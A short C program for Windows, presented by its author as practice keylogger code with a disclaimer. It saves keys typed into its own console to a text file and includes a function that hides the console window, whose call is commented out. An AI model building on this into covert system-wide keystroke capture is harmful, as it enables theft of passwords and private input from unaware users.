/*
Code written by TRISTAN QUERTON on 12/09/2020
All rights reserved
This code is able to record and store all keystrokes pressed.
This code is only practice and is not intended for hacking purposes.
I will NOT be held responsible for anything silly you may do with this!
*/

#define _WIN32_WINNT 0x0500 // used to get the OS and current version of windows

#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>

// function declaration
void Stealth();

int main()
{
    // another way to hide the console
    /*HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);*/

    // hide the console
    /// Stealth();

    // Declaration
    char key;
    int compteur = 0;

    // Creation of the backup file
    FILE *capture;
    capture = fopen("saveKeylogger.txt", "w");

    // Error while openning operation of the backup
    if (capture == NULL)
    {
        printf("ERROR\n");
        exit(1); // force quit the prog
    }

    // If the file can be open
    else
    {
        fprintf(capture, "All the keystrocks pressed will be saved in this file :\n");
        while (1) // while true (infinit loop)
        {

            if (kbhit()) // if a key is pressed
            {
                key = getch();               // the key pressed is put in the var key
                fprintf(capture, "%c", key); // var key is save in the backup file
                compteur++;
            }
            Sleep(10); // sleep the prog for less lag
            if (key == 0x1B)
            {
                fprintf(capture, "\n\nWe just saved %d keystrockes", compteur);
                fclose(capture); // closing file if the user press ESCAPE
                exit(0);         // close the file
            }
        }
    }
    return 0;
}

// function used to hide the console while running the prog
void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}